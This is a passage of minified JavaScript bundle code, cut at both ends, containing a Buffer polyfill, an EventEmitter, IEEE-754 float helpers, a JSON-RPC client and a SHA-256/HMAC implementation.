32768&r?4294901760|r:r},c.prototype.readInt16BE=function(t,e){t>>>=0,e||R(t,2,this.length);const r=this[t+1]|this[t]<<8;return 32768&r?4294901760|r:r},c.prototype.readInt32LE=function(t,e){return t>>>=0,e||R(t,4,this.length),this[t]|this[t+1]<<8|this[t+2]<<16|this[t+3]<<24},c.prototype.readInt32BE=function(t,e){return t>>>=0,e||R(t,4,this.length),this[t]<<24|this[t+1]<<16|this[t+2]<<8|this[t+3]},c.prototype.readBigInt64LE=X((function(t){F(t>>>=0,"offset");const e=this[t],r=this[t+7];void 0!==e&&void 0!==r||H(t,this.length-8);const n=this[t+4]+256*this[t+5]+65536*this[t+6]+(r<<24);return(BigInt(n)<<BigInt(32))+BigInt(e+256*this[++t]+65536*this[++t]+this[++t]*2**24)})),c.prototype.readBigInt64BE=X((function(t){F(t>>>=0,"offset");const e=this[t],r=this[t+7];void 0!==e&&void 0!==r||H(t,this.length-8);const n=(e<<24)+65536*this[++t]+256*this[++t]+this[++t];return(BigInt(n)<<BigInt(32))+BigInt(this[++t]*2**24+65536*this[++t]+256*this[++t]+r)})),c.prototype.readFloatLE=function(t,e){return t>>>=0,e||R(t,4,this.length),i.read(this,t,!0,23,4)},c.prototype.readFloatBE=function(t,e){return t>>>=0,e||R(t,4,this.length),i.read(this,t,!1,23,4)},c.prototype.readDoubleLE=function(t,e){return t>>>=0,e||R(t,8,this.length),i.read(this,t,!0,52,8)},c.prototype.readDoubleBE=function(t,e){return t>>>=0,e||R(t,8,this.length),i.read(this,t,!1,52,8)},c.prototype.writeUintLE=c.prototype.writeUIntLE=function(t,e,r,n){t=+t,e>>>=0,r>>>=0,n||P(this,t,e,r,Math.pow(2,8*r)-1,0);let i=1,o=0;for(this[e]=255&t;++o<r&&(i*=256);)this[e+o]=t/i&255;return e+r},c.prototype.writeUintBE=c.prototype.writeUIntBE=function(t,e,r,n){t=+t,e>>>=0,r>>>=0,n||P(this,t,e,r,Math.pow(2,8*r)-1,0);let i=r-1,o=1;for(this[e+i]=255&t;--i>=0&&(o*=256);)this[e+i]=t/o&255;return e+r},c.prototype.writeUint8=c.prototype.writeUInt8=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,1,255,0),this[e]=255&t,e+1},c.prototype.writeUint16LE=c.prototype.writeUInt16LE=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,2,65535,0),this[e]=255&t,this[e+1]=t>>>8,e+2},c.prototype.writeUint16BE=c.prototype.writeUInt16BE=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,2,65535,0),this[e]=t>>>8,this[e+1]=255&t,e+2},c.prototype.writeUint32LE=c.prototype.writeUInt32LE=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,4,4294967295,0),this[e+3]=t>>>24,this[e+2]=t>>>16,this[e+1]=t>>>8,this[e]=255&t,e+4},c.prototype.writeUint32BE=c.prototype.writeUInt32BE=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,4,4294967295,0),this[e]=t>>>24,this[e+1]=t>>>16,this[e+2]=t>>>8,this[e+3]=255&t,e+4},c.prototype.writeBigUInt64LE=X((function(t,e=0){return C(this,t,e,BigInt(0),BigInt("0xffffffffffffffff"))})),c.prototype.writeBigUInt64BE=X((function(t,e=0){return L(this,t,e,BigInt(0),BigInt("0xffffffffffffffff"))})),c.prototype.writeIntLE=function(t,e,r,n){if(t=+t,e>>>=0,!n){const n=Math.pow(2,8*r-1);P(this,t,e,r,n-1,-n)}let i=0,o=1,s=0;for(this[e]=255&t;++i<r&&(o*=256);)t<0&&0===s&&0!==this[e+i-1]&&(s=1),this[e+i]=(t/o|0)-s&255;return e+r},c.prototype.writeIntBE=function(t,e,r,n){if(t=+t,e>>>=0,!n){const n=Math.pow(2,8*r-1);P(this,t,e,r,n-1,-n)}let i=r-1,o=1,s=0;for(this[e+i]=255&t;--i>=0&&(o*=256);)t<0&&0===s&&0!==this[e+i+1]&&(s=1),this[e+i]=(t/o|0)-s&255;return e+r},c.prototype.writeInt8=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,1,127,-128),t<0&&(t=255+t+1),this[e]=255&t,e+1},c.prototype.writeInt16LE=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,2,32767,-32768),this[e]=255&t,this[e+1]=t>>>8,e+2},c.prototype.writeInt16BE=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,2,32767,-32768),this[e]=t>>>8,this[e+1]=255&t,e+2},c.prototype.writeInt32LE=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,4,2147483647,-2147483648),this[e]=255&t,this[e+1]=t>>>8,this[e+2]=t>>>16,this[e+3]=t>>>24,e+4},c.prototype.writeInt32BE=function(t,e,r){return t=+t,e>>>=0,r||P(this,t,e,4,2147483647,-2147483648),t<0&&(t=4294967295+t+1),this[e]=t>>>24,this[e+1]=t>>>16,this[e+2]=t>>>8,this[e+3]=255&t,e+4},c.prototype.writeBigInt64LE=X((function(t,e=0){return C(this,t,e,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))})),c.prototype.writeBigInt64BE=X((function(t,e=0){return L(this,t,e,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))})),c.prototype.writeFloatLE=function(t,e,r){return U(this,t,e,!0,r)},c.prototype.writeFloatBE=function(t,e,r){return U(this,t,e,!1,r)},c.prototype.writeDoubleLE=function(t,e,r){return z(this,t,e,!0,r)},c.prototype.writeDoubleBE=function(t,e,r){return z(this,t,e,!1,r)},c.prototype.copy=function(t,e,r,n){if(!c.isBuffer(t))throw new TypeError("argument should be a Buffer");if(r||(r=0),n||0===n||(n=this.length),e>=t.length&&(e=t.length),e||(e=0),n>0&&n<r&&(n=r),n===r)return 0;if(0===t.length||0===this.length)return 0;if(e<0)throw new RangeError("targetStart out of bounds");if(r<0||r>=this.length)throw new RangeError("Index out of range");if(n<0)throw new RangeError("sourceEnd out of bounds");n>this.length&&(n=this.length),t.length-e<n-r&&(n=t.length-e+r);const i=n-r;return this===t&&"function"==typeof Uint8Array.prototype.copyWithin?this.copyWithin(e,r,n):Uint8Array.prototype.set.call(t,this.subarray(r,n),e),i},c.prototype.fill=function(t,e,r,n){if("string"==typeof t){if("string"==typeof e?(n=e,e=0,r=this.length):"string"==typeof r&&(n=r,r=this.length),void 0!==n&&"string"!=typeof n)throw new TypeError("encoding must be a string");if("string"==typeof n&&!c.isEncoding(n))throw new TypeError("Unknown encoding: "+n);if(1===t.length){const e=t.charCodeAt(0);("utf8"===n&&e<128||"latin1"===n)&&(t=e)}}else"number"==typeof t?t&=255:"boolean"==typeof t&&(t=Number(t));if(e<0||this.length<e||this.length<r)throw new RangeError("Out of range index");if(r<=e)return this;let i;if(e>>>=0,r=void 0===r?this.length:r>>>0,t||(t=0),"number"==typeof t)for(i=e;i<r;++i)this[i]=t;else{const o=c.isBuffer(t)?t:c.from(t,n),s=o.length;if(0===s)throw new TypeError('The value "'+t+'" is invalid for argument "value"');for(i=0;i<r-e;++i)this[i+e]=o[i%s]}return this};const D={};function j(t,e,r){D[t]=class extends r{constructor(){super(),Object.defineProperty(this,"message",{value:e.apply(this,arguments),writable:!0,configurable:!0}),this.name=`${this.name} [${t}]`,this.stack,delete this.name}get code(){return t}set code(t){Object.defineProperty(this,"code",{configurable:!0,enumerable:!0,value:t,writable:!0})}toString(){return`${this.name} [${t}]: ${this.message}`}}}function W(t){let e="",r=t.length;const n="-"===t[0]?1:0;for(;r>=n+4;r-=3)e=`_${t.slice(r-3,r)}${e}`;return`${t.slice(0,r)}${e}`}function q(t,e,r,n,i,o){if(t>r||t<e){const n="bigint"==typeof e?"n":"";let i;throw i=o>3?0===e||e===BigInt(0)?`>= 0${n} and < 2${n} ** ${8*(o+1)}${n}`:`>= -(2${n} ** ${8*(o+1)-1}${n}) and < 2 ** ${8*(o+1)-1}${n}`:`>= ${e}${n} and <= ${r}${n}`,new D.ERR_OUT_OF_RANGE("value",i,t)}!function(t,e,r){F(e,"offset"),void 0!==t[e]&&void 0!==t[e+r]||H(e,t.length-(r+1))}(n,i,o)}function F(t,e){if("number"!=typeof t)throw new D.ERR_INVALID_ARG_TYPE(e,"number",t)}function H(t,e,r){if(Math.floor(t)!==t)throw F(t,r),new D.ERR_OUT_OF_RANGE(r||"offset","an integer",t);if(e<0)throw new D.ERR_BUFFER_OUT_OF_BOUNDS;throw new D.ERR_OUT_OF_RANGE(r||"offset",`>= ${r?1:0} and <= ${e}`,t)}j("ERR_BUFFER_OUT_OF_BOUNDS",(function(t){return t?`${t} is outside of buffer bounds`:"Attempt to access memory outside buffer bounds"}),RangeError),j("ERR_INVALID_ARG_TYPE",(function(t,e){return`The "${t}" argument must be of type number. Received type ${typeof e}`}),TypeError),j("ERR_OUT_OF_RANGE",(function(t,e,r){let n=`The value of "${t}" is out of range.`,i=r;return Number.isInteger(r)&&Math.abs(r)>2**32?i=W(String(r)):"bigint"==typeof r&&(i=String(r),(r>BigInt(2)**BigInt(32)||r<-(BigInt(2)**BigInt(32)))&&(i=W(i)),i+="n"),n+=` It must be ${e}. Received ${i}`,n}),RangeError);const K=/[^+/0-9A-Za-z-_]/g;function $(t,e){let r;e=e||1/0;const n=t.length;let i=null;const o=[];for(let s=0;s<n;++s){if(r=t.charCodeAt(s),r>55295&&r<57344){if(!i){if(r>56319){(e-=3)>-1&&o.push(239,191,189);continue}if(s+1===n){(e-=3)>-1&&o.push(239,191,189);continue}i=r;continue}if(r<56320){(e-=3)>-1&&o.push(239,191,189),i=r;continue}r=65536+(i-55296<<10|r-56320)}else i&&(e-=3)>-1&&o.push(239,191,189);if(i=null,r<128){if((e-=1)<0)break;o.push(r)}else if(r<2048){if((e-=2)<0)break;o.push(r>>6|192,63&r|128)}else if(r<65536){if((e-=3)<0)break;o.push(r>>12|224,r>>6&63|128,63&r|128)}else{if(!(r<1114112))throw new Error("Invalid code point");if((e-=4)<0)break;o.push(r>>18|240,r>>12&63|128,r>>6&63|128,63&r|128)}}return o}function V(t){return n.toByteArray(function(t){if((t=(t=t.split("=")[0]).trim().replace(K,"")).length<2)return"";for(;t.length%4!=0;)t+="=";return t}(t))}function G(t,e,r,n){let i;for(i=0;i<n&&!(i+r>=e.length||i>=t.length);++i)e[i+r]=t[i];return i}function J(t,e){return t instanceof e||null!=t&&null!=t.constructor&&null!=t.constructor.name&&t.constructor.name===e.name}function Z(t){return t!=t}const Y=function(){const t="0123456789abcdef",e=new Array(256);for(let r=0;r<16;++r){const n=16*r;for(let i=0;i<16;++i)e[n+i]=t[r]+t[i]}return e}();function X(t){return"undefined"==typeof BigInt?Q:t}function Q(){throw new Error("BigInt not supported")}},228:t=>{"use strict";var e=Object.prototype.hasOwnProperty,r="~";function n(){}function i(t,e,r){this.fn=t,this.context=e,this.once=r||!1}function o(t,e,n,o,s){if("function"!=typeof n)throw new TypeError("The listener must be a function");var a=new i(n,o||t,s),c=r?r+e:e;return t._events[c]?t._events[c].fn?t._events[c]=[t._events[c],a]:t._events[c].push(a):(t._events[c]=a,t._eventsCount++),t}function s(t,e){0==--t._eventsCount?t._events=new n:delete t._events[e]}function a(){this._events=new n,this._eventsCount=0}Object.create&&(n.prototype=Object.create(null),(new n).__proto__||(r=!1)),a.prototype.eventNames=function(){var t,n,i=[];if(0===this._eventsCount)return i;for(n in t=this._events)e.call(t,n)&&i.push(r?n.slice(1):n);return Object.getOwnPropertySymbols?i.concat(Object.getOwnPropertySymbols(t)):i},a.prototype.listeners=function(t){var e=r?r+t:t,n=this._events[e];if(!n)return[];if(n.fn)return[n.fn];for(var i=0,o=n.length,s=new Array(o);i<o;i++)s[i]=n[i].fn;return s},a.prototype.listenerCount=function(t){var e=r?r+t:t,n=this._events[e];return n?n.fn?1:n.length:0},a.prototype.emit=function(t,e,n,i,o,s){var a=r?r+t:t;if(!this._events[a])return!1;var c,u,h=this._events[a],l=arguments.length;if(h.fn){switch(h.once&&this.removeListener(t,h.fn,void 0,!0),l){case 1:return h.fn.call(h.context),!0;case 2:return h.fn.call(h.context,e),!0;case 3:return h.fn.call(h.context,e,n),!0;case 4:return h.fn.call(h.context,e,n,i),!0;case 5:return h.fn.call(h.context,e,n,i,o),!0;case 6:return h.fn.call(h.context,e,n,i,o,s),!0}for(u=1,c=new Array(l-1);u<l;u++)c[u-1]=arguments[u];h.fn.apply(h.context,c)}else{var f,d=h.length;for(u=0;u<d;u++)switch(h[u].once&&this.removeListener(t,h[u].fn,void 0,!0),l){case 1:h[u].fn.call(h[u].context);break;case 2:h[u].fn.call(h[u].context,e);break;case 3:h[u].fn.call(h[u].context,e,n);break;case 4:h[u].fn.call(h[u].context,e,n,i);break;default:if(!c)for(f=1,c=new Array(l-1);f<l;f++)c[f-1]=arguments[f];h[u].fn.apply(h[u].context,c)}}return!0},a.prototype.on=function(t,e,r){return o(this,t,e,r,!1)},a.prototype.once=function(t,e,r){return o(this,t,e,r,!0)},a.prototype.removeListener=function(t,e,n,i){var o=r?r+t:t;if(!this._events[o])return this;if(!e)return s(this,o),this;var a=this._events[o];if(a.fn)a.fn!==e||i&&!a.once||n&&a.context!==n||s(this,o);else{for(var c=0,u=[],h=a.length;c<h;c++)(a[c].fn!==e||i&&!a[c].once||n&&a[c].context!==n)&&u.push(a[c]);u.length?this._events[o]=1===u.length?u[0]:u:s(this,o)}return this},a.prototype.removeAllListeners=function(t){var e;return t?(e=r?r+t:t,this._events[e]&&s(this,e)):(this._events=new n,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=r,a.EventEmitter=a,t.exports=a},251:(t,e)=>{e.read=function(t,e,r,n,i){var o,s,a=8*i-n-1,c=(1<<a)-1,u=c>>1,h=-7,l=r?i-1:0,f=r?-1:1,d=t[e+l];for(l+=f,o=d&(1<<-h)-1,d>>=-h,h+=a;h>0;o=256*o+t[e+l],l+=f,h-=8);for(s=o&(1<<-h)-1,o>>=-h,h+=n;h>0;s=256*s+t[e+l],l+=f,h-=8);if(0===o)o=1-u;else{if(o===c)return s?NaN:1/0*(d?-1:1);s+=Math.pow(2,n),o-=u}return(d?-1:1)*s*Math.pow(2,o-n)},e.write=function(t,e,r,n,i,o){var s,a,c,u=8*o-i-1,h=(1<<u)-1,l=h>>1,f=23===i?Math.pow(2,-24)-Math.pow(2,-77):0,d=n?0:o-1,p=n?1:-1,g=e<0||0===e&&1/e<0?1:0;for(e=Math.abs(e),isNaN(e)||e===1/0?(a=isNaN(e)?1:0,s=h):(s=Math.floor(Math.log(e)/Math.LN2),e*(c=Math.pow(2,-s))<1&&(s--,c*=2),(e+=s+l>=1?f/c:f*Math.pow(2,1-l))*c>=2&&(s++,c/=2),s+l>=h?(a=0,s=h):s+l>=1?(a=(e*c-1)*Math.pow(2,i),s+=l):(a=e*Math.pow(2,l-1)*Math.pow(2,i),s=0));i>=8;t[r+d]=255&a,d+=p,a/=256,i-=8);for(s=s<<i|a,u+=i;u>0;t[r+d]=255&s,d+=p,s/=256,u-=8);t[r+d-p]|=128*g}},22:(t,e,r)=>{"use strict";const n=r(341).v4,i=r(289),o=function(t,e){if(!(this instanceof o))return new o(t,e);e||(e={}),this.options={reviver:void 0!==e.reviver?e.reviver:null,replacer:void 0!==e.replacer?e.replacer:null,generator:void 0!==e.generator?e.generator:function(){return n()},version:void 0!==e.version?e.version:2,notificationIdNull:"boolean"==typeof e.notificationIdNull&&e.notificationIdNull},this.callServer=t};t.exports=o,o.prototype.request=function(t,e,r,n){const o=this;let s=null;const a=Array.isArray(t)&&"function"==typeof e;if(1===this.options.version&&a)throw new TypeError("JSON-RPC 1.0 does not support batching");if(a||!a&&t&&"object"==typeof t&&"function"==typeof e)n=e,s=t;else{"function"==typeof r&&(n=r,r=void 0);const o="function"==typeof n;try{s=i(t,e,r,{generator:this.options.generator,version:this.options.version,notificationIdNull:this.options.notificationIdNull})}catch(t){if(o)return n(t);throw t}if(!o)return s}let c;try{c=JSON.stringify(s,this.options.replacer)}catch(t){return n(t)}return this.callServer(c,(function(t,e){o._parseResponse(t,e,n)})),s},o.prototype._parseResponse=function(t,e,r){if(t)return void r(t);if(!e)return r();let n;try{n=JSON.parse(e,this.options.reviver)}catch(t){return r(t)}if(3===r.length){if(Array.isArray(n)){const t=function(t){return void 0!==t.error},e=function(e){return!t(e)};return r(null,n.filter(t),n.filter(e))}return r(null,n.error,n.result)}r(null,n)}},289:(t,e,r)=>{"use strict";const n=r(341).v4;t.exports=function(t,e,r,i){if("string"!=typeof t)throw new TypeError(t+" must be a string");const o="number"==typeof(i=i||{}).version?i.version:2;if(1!==o&&2!==o)throw new TypeError(o+" must be 1 or 2");const s={method:t};if(2===o&&(s.jsonrpc="2.0"),e){if("object"!=typeof e&&!Array.isArray(e))throw new TypeError(e+" must be an object, array or omitted");s.params=e}if(void 0===r){const t="function"==typeof i.generator?i.generator:function(){return n()};s.id=t(s,i)}else 2===o&&null===r?i.notificationIdNull&&(s.id=null):s.id=r;return s}},312:(t,e,r)=>{var n;!function(){"use strict";var e="input is invalid type",i="object"==typeof window,o=i?window:{};o.JS_SHA256_NO_WINDOW&&(i=!1);var s=!i&&"object"==typeof self,a=!o.JS_SHA256_NO_NODE_JS&&"object"==typeof process&&process.versions&&process.versions.node;a?o=r.g:s&&(o=self);var c=!o.JS_SHA256_NO_COMMON_JS&&t.exports,u=r.amdO,h=!o.JS_SHA256_NO_ARRAY_BUFFER&&"undefined"!=typeof ArrayBuffer,l="0123456789abcdef".split(""),f=[-2147483648,8388608,32768,128],d=[24,16,8,0],p=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298],g=["hex","array","digest","arrayBuffer"],m=[];!o.JS_SHA256_NO_NODE_JS&&Array.isArray||(Array.isArray=function(t){return"[object Array]"===Object.prototype.toString.call(t)}),!h||!o.JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&&ArrayBuffer.isView||(ArrayBuffer.isView=function(t){return"object"==typeof t&&t.buffer&&t.buffer.constructor===ArrayBuffer});var y=function(t,e){return function(r){return new S(e,!0).update(r)[t]()}},w=function(t){var e=y("hex",t);a&&(e=b(e,t)),e.create=function(){return new S(t)},e.update=function(t){return e.create().update(t)};for(var r=0;r<g.length;++r){var n=g[r];e[n]=y(n,t)}return e},b=function(t,n){var i,s=r(394),a=r(903).Buffer,c=n?"sha224":"sha256";return i=a.from&&!o.JS_SHA256_NO_BUFFER_FROM?a.from:function(t){return new a(t)},function(r){if("string"==typeof r)return s.createHash(c).update(r,"utf8").digest("hex");if(null==r)throw new Error(e);return r.constructor===ArrayBuffer&&(r=new Uint8Array(r)),Array.isArray(r)||ArrayBuffer.isView(r)||r.constructor===a?s.createHash(c).update(i(r)).digest("hex"):t(r)}},v=function(t,e){return function(r,n){return new A(r,e,!0).update(n)[t]()}},k=function(t){var e=v("hex",t);e.create=function(e){return new A(e,t)},e.update=function(t,r){return e.create(t).update(r)};for(var r=0;r<g.length;++r){var n=g[r];e[n]=v(n,t)}return e};function S(t,e){e?(m[0]=m[16]=m[1]=m[2]=m[3]=m[4]=m[5]=m[6]=m[7]=m[8]=m[9]=m[10]=m[11]=m[12]=m[13]=m[14]=m[15]=0,this.blocks=m):this.blocks=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],t?(this.h0=3238371032,this.h1=914150663,this.h2=812702999,this.h3=4144912697,this.h4=4290775857,this.h5=1750603025,this.h6=1694076839,this.h7=3204075428):(this.h0=1779033703,this.h1=3144134277,this.h2=1013904242,this.h3=2773480762,this.h4=1359893119,this.h5=2600822924,this.h6=528734635,this.h7=1541459225),this.block=this.start=this.bytes=this.hBytes=0,this.finalized=this.hashed=!1,this.first=!0,this.is224=t}function A(t,r,n){var i,o=typeof t;if("string"===o){var s,a=[],c=t.length,u=0;for(i=0;i<c;++i)(s=t.charCodeAt(i))<128?a[u++]=s:s<2048?(a[u++]=192|s>>>6,a[u++]=128|63&s):s<55296||s>=57344?(a[u++]=224|s>>>12,a[u++]=128|s>>>6&63,a[u++]=128|63&s):(s=65536+((1023&s)<<10|1023&t.charCodeAt(++i)),a[u++]=240|s>>>18,a[u++]=128|s>>>12&63,a[u++]=128|s>>>6&63,a[u++]=128|63&s);t=a}else{if("object"!==o)throw new Error(e);if(null===t)throw new Error(e);if(h&&t.constructor===ArrayBuffer)t=new Uint8Array(t);else if(!(Array.isArray(t)||h&&ArrayBuffer.isView(t)))throw new Error(e)}t.length>64&&(t=new S(r,!0).update(t).array());var l=[],f=[];for(i=0;i<64;++i){var d=t[i]||0;l[i]=92^d,f[i]=54^d}S.call(this,r,n),this.update(f),this.oKeyPad=l,this.inner=!0,this.sharedMemory=n}S.prototype.update=function(t){if(!this.finalized){var r,n=typeof t;if("string"!==n){if("object"!==n)throw new Error(e);if(null===t)throw new Error(e);if(h&&t.constructor===ArrayBuffer)t=new Uint8Array(t);else if(!(Array.isArray(t)||h&&ArrayBuffer.isView(t)))throw new Error(e);r=!0}for(var i,o,s=0,a=t.length,c=this.blocks;s<a;){if(this.hashed&&(this.hashed=!1,c[0]=this.block,this.block=c[16]=c[1]=c[2]=c[3]=c[4]=c[5]=c[6]=c[7]=c[8]=c[9]=c[10]=c[11]=c[12]=c[13]=c[14]=c[15]=0),r)for(o=this.start;s<a&&o<64;++s)c[o>>>2]|=t[s]<<d[3&o++];else for(o=this.start;s<a&&o<64;++s)(i=t.charCodeAt(s))<128?c[o>>>2]|=i<<d[3&o++]:i<2048?(c[o>>>2]|=(192|i>>>6)<<d[3&o++],c[o>>>2]|=(128|63&i)<<d[3&o++]):i<55296||i>=57344?(c[o>>>2]|=(224|i>>>12)<<d[3&o++],c[o>>>2]|=(128|i>>>6&63)<<d[3&o++],c[o>>>2]|=(128|63&i)<<d[3&o++]):(i=65536+((1023&i)<<10|1023&t.charCodeAt(++s)),c[o>>>2]|=(240|i>>>18)<<d[3&o++],c[o>>>2]|=(128|i>>>12&63)<<d[3&o++],c[o>>>2]|=(128|i>>>6&63)<<d[3&o++],c[o>>>2]|=(128|63&i)<<d[3&o++]);this.lastByteIndex=o,this.bytes+=o-this.start,o>=64?(this.block=c[16],this.start=o-64,this.hash(),this.hashed=!0):this.start=o}return this.bytes>4294967295&&(this.hBytes+=this.bytes/4294967296|0,this.bytes=this.bytes%4294967296),this}},S.prototype.finalize=function(){if(!this.finalized){this.finalized=!0;var t=this.blocks,e=this.lastByteIndex;t[16]=this.block,t[e>>>2]|=f[3&e],this.block=t[16],e>=56&&(this.hashed||this.hash(),t[0]=this.block,t[16]=t[1]=t[2]=t[3]=t[4]=t[5]=t[6]=t[7]=t[8]=t[9]=t[10]=t[11]=t[12]=t[13]=t[14]=t[15]=0),t[14]=this.hBytes<<3|this.bytes>>>29,t[15]=this.bytes<<3,this.hash()}},S.prototype.hash=function(){var t,e,r,n,i,o,s,a,c,u=this.h0,h=this.h1,l=this.h2,f=this.h3,d=this.h4,g=this.h5,m=this.h6,y=this.h7,w=this.blocks;for(t=16;t<64;++t)e=((i=w[t-15])>>>7|i<<25)^(i>>>18|i<<14)^i>>>3,r=((i=w[t-2])>>>17|i<<15)^(i>>>19|i<<13)^i>>>10,w[t]=w[t-16]+e+w[t-7]+r|0;for(c=h&l,t=0;t<64;t+=4)this.first?(this.is224?(o=300032,y=(i=w[0]-1413257819)-150054599|0,f=i+24177077|0):(o=704751109,y=(i=w[0]-210244248)-1521486534|0,f=i+143694565|0),this.first=!1):(e=(u>>>2|u<<30)^(u>>>13|u<<19)^(u>>>22|u<<10),n=(o=u&h)^u&l^c,y=f+(i=y+(r=(d>>>6|d<<26)^(d>>>11|d<<21)^(d>>>25|d<<7))+(d&g^~d&m)+p[t]+w[t])|0,f=i+(e+n)|0),e=(f>>>2|f<<30)^(f>>>13|f<<19)^(f>>>22|f<<10),n=(s=f&u)^f&h^o,m=l+(i=m+(r=(y>>>6|y<<26)^(y>>>11|y<<21)^(y>>>25|y<<7))+(y&d^~y&g)+p[t+1]+w[t+1])|0,e=((l=i+(e+n)|0)>>>2|l<<30)^(l>>>13|l<<19)^(l>>>22|l<<10),n=(a=l&f)^l&u^s,g=h+(i=g+(r=(m>>>6|m<<26)^(m>>>11|m<<21)^(m>>>25|m<<7))+(m&y^~m&d)+p[t+2]+w[t+2])|0,e=((h=i+(e+n)|0)>>>2|h<<30)^(h>>>13|h<<19)^(h>>>22|h<<10),n=(c=h&l)^h&f^a,d=u+(i=d+(r=(g>>>6|g<<26)^(g>>>11|g<<21)^(g>>>25|g<<7))+(g&m^~g&y)+p[t+3]+w[t+3])|0,u=i+(e+n)|0,this.chromeBugWorkAround=!0;this.h0=this.h0+u|0,this.h1=this.h1+h|0,this.h2=this.h2+l|0,this.h3=this.h3+f|0,this.h4=this.h4+d|0,this.h5=this.h5+g|0,this.h6=this.h6+m|0,this.h7=this.h7+y|0},S.prototype.hex=function(){this.finalize();var t=this.h0,e=this.h1,r=this.h2,n=this.h3,i=this.h4,o=this.h5,s=this.h6,a=this.h7,c=l[t>>>28&15]+l[t>>>24&15]+l[t>>>20&15]+l[t>>>16&15]+l[t>>>12&15]+l[t>>>8&15]+l[t>>>4&15]+l[15&t]+l[e>>>28&15]+l[e>>>24&15]+l[e>>>20&15]+l[e>>>16&15]+l[e>>>12&15]+l[e>>>8&15]+l[e>>>4&15]+l[15&e]+l[r>>>28&15]+l[r>>>24&15]+l[r>>>20&15]+l[r>>>16&15]+l[r>>>12&15]+l[r>>>8&15]+l[r>>>4&15]+l[15&r]+l[n>>>28&15]+l[n>>>24&15]+l[n>>>20&15]+l[n>>>16&15]+l[n>>>12&15]+l[n>>>8&15]+l[n>>>4&15]+l[15&n]+l[i>>>28&15]+l[i>>>24&15]+l[i>>>20&15]+l[i>>>16&15]+l[i>>>12&15]+l[i>>>8&15]+l[i>>>4&15]+l[15&i]+l[o>>>28&15]+l[o>>>24&15]+l[o>>>20&15]+l[o>>>16&15]+l[o>>>12&15]+l[o>>>8&15]+l[o>>>4&15]+l[15&o]+l[s>>>28&15]+l[s>>>24&15]+l[s>>>20&15]+l[s>>>16&15]+l[s>>>12&15]+l[s>>>8&15]+l[s>>>4&15]+l[15&s];return this.is224||(c+=l[a>>>28&15]+l[a>>>24&15]+l[a>>>20&15]+l[a>>>16&15]+l[a>>>12&15]+l[a>>>8&15]+l[a>>>4&15]+l[15&a]),c},S.prototype.toString=S.prototype.hex,S.prototype.digest=function(){this.finalize();var t=this.h0,e=this.h1,r=this.h2,n=this.h3,i=this.h4,o=this.h5,s=this.h6,a=this.h7,c=[t>>>24&255,t>>>16&255,t>>>8&255,255&t,e>>>24&255,e>>>16&255,e>>>8&255,255&e,r>>>24&255,r>>>16&255,r>>>8&255,255&r,n>>>24&255,n>>>16&255,n>>>8&255,255&n,i>>>24&255,i>>>16&255,i>>>8&255,255&i,o>>>24&255,o>>>16&255,o>>>8&255,255&o,s>>>24&255,s>>>16&255,s>>>8&255,255&s];return this.is224||c.push(a>>>24&255,a>>>16&255,a>>>8&255,255&a),c},S.prototype.array=S.prototype.digest,S.prototype.arrayBuffer=function(){this.finalize();var t=new ArrayBuffer(this.is224?28:32),e=new DataView(t);return e.setUint32(0,this.h0),e.setUint32(4,this.h1),e.setUint32(8,this.h2),e.setUint32(12,this.h3),e.setUint32(16,this.h4),e.setUint32(20,this.h5),e.setUint32(24,this.h6),this.is224||e.setUint32(28,this.h7),t},A.prototype=new S,A.prototype.finalize=function(){if(S.prototype.finalize.call(this),this.inner){this.inner=!1;var t=this.array();S.call(this,this.is224,this.sharedMemory),this.update(this.oKeyPad),this.update(t),S.prototype.finalize.call(this)}};var E=w();E.sha256=E,E.sha224=w(!0),E.sha256.hmac=k(),E.sha224.hmac=k(!0),c?t.exports=E:(o.sha256=E.sha256,o.sha224=E.sha224,u&&(void 0===(n=function(){return E}.call(E,r,E,t))||(t.exports=n)))}()},861:(t,e,r)=>{var n=r(287),i=n.Buffer;function o(t,e){for(var r in t)e[r]=t[r]}function s(t,e,r){return i(t,e,r)}i.from&&i.alloc&&i.allocUnsafe&&i.allocUnsafeSlow?t.exports=n:(o(n,e),e.Buffer=s),s.prototype=Object.create(i.prototype),o(i,s),s.from=function(t,e,r){if("number"==typeof t)throw new TypeError("Argument must not be a number");return i(t,e,r)},s.alloc=function(t,e,r){if("number"!=typeof t)throw new TypeError("Argument must be a number");var n=i(t);return void 0!==e?"string"==typeof r?n.fill(e,r):n.fill(e):n.fill(0),n},s.allocUnsafe=function(t){if("number"!=typeof t)throw new TypeError("Argument must be a number");return i(t)},s.allocUnsafeSlow=function(t){if("number"!=typeof t)throw new TypeError("Argument must be a number");return n.SlowBuffer(t)}},281:(t,e)=>{"use strict";function r(t,e,r){return e<=t&&t<=r}function n(t){if(void 0===t)return{};if(t===Object(t))return t;throw TypeError("Could not convert argument to dictionary")}function i(t){this.tokens=[].slice.call(t)}i.prototype={endOfStream:function(){return!this.tokens.length},read:function(){return this.tokens.length?this.tokens.shift():-1},prepend:function(t){if(Array.isArray(t))for(var e=t;e.length;)this.tokens.unshift(e.pop());else this.tokens.unshift(t)},push:function(t){if(Array.isArray(t))for(var e=t;e.length;)this.tokens.push(e.shift());else this.tokens.push(t)}};var 